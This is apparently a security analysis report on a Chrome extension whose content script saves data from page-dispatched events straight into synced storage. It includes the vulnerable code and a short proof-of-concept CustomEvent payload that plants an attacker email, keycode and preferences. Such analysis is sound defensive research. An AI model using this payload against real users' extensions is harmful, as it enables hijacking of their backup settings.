# CoCo Analysis: pledpfihfkajgnflpiddejaoealphbni

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1 (3 storage writes: bpp-email, bpp-keycode, bpp-prefs)

---

## Sink: document_eventListener_update_bpp_online_settings → chrome_storage_sync_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/pledpfihfkajgnflpiddejaoealphbni/opgen_generated_files/cs_0.js
Line 520	data
Line 521	data.detail
Line 502	data['email']
Line 501	data['orderid']
Line 503	data['prefs']

**Code:**

```javascript
// Content script (cs_0.js lines 500-507)
function bpp_ext_actions(request, data) {
    if (request == 'update_bpp_online_settings') {
        var bpp_keycode = data['orderid']; // ← attacker-controlled
        var bpp_email = data['email'];     // ← attacker-controlled
        var bpp_prefs = data['prefs'];     // ← attacker-controlled
        chrome.storage.sync.set({"bpp-email": bpp_email});
        chrome.storage.sync.set({"bpp-keycode": bpp_keycode});
        chrome.storage.sync.set({"bpp-prefs": bpp_prefs});
    }
}

// Content script (cs_0.js lines 520-522)
document.addEventListener("update_bpp_online_settings", function(data) {
    bpp_ext_actions("update_bpp_online_settings", data.detail); // ← attacker-controlled via event
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM event

**Attack:**

```javascript
// On https://online.bestplanpro.com/* (matches in manifest)
// Attacker controls the webpage and dispatches custom event
const maliciousEvent = new CustomEvent('update_bpp_online_settings', {
    detail: {
        orderid: 'ATTACKER_KEYCODE_12345',
        email: 'attacker@evil.com',
        prefs: {
            malicious: 'settings',
            backdoor: 'enabled'
        }
    }
});
document.dispatchEvent(maliciousEvent);
```

**Impact:** Attacker can poison chrome.storage.sync with arbitrary email, keycode, and preferences data. The webpage at online.bestplanpro.com can inject malicious configuration data into the extension's storage, potentially hijacking the user's backup settings, redirecting backups to attacker-controlled accounts, or injecting malicious preferences that could affect extension behavior.
